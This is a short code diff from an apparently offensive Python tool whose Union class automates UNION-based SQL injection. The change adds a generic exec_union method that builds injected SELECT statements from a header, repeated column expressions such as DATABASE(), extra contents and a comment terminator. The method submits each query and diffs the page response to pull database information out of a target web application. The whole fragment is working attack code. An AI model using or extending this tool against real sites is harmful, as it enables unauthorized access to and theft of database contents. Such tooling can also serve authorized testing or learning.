@@ -60,13 +60,16 @@ class Union:
 		print(f"colum counts: {colum_counts}")
 		return colum_counts
 
-	def get_database_name(self):
-		colum_lst = ["DATABASE()"] * self.colum_counts
+	def exec_union(self, colum_name, contents):
+		colum_lst = [colum_name] * self.colum_counts
 		colums = ", ".join(colum_lst)
-		query = self.header + "SELECT " + colums + self.comment
-		print(query)
+		query = self.header + "SELECT " + colums + contents + self.comment
+		print(f"QUERY: {query}")
 		res = self.submit(query)
 		print_diff(self.original_text, res.text)
+
+	def get_database_name(self):
+		self.exec_union("DATABASE()", "")
 
 	def union(self):
 		self.get_database_name()
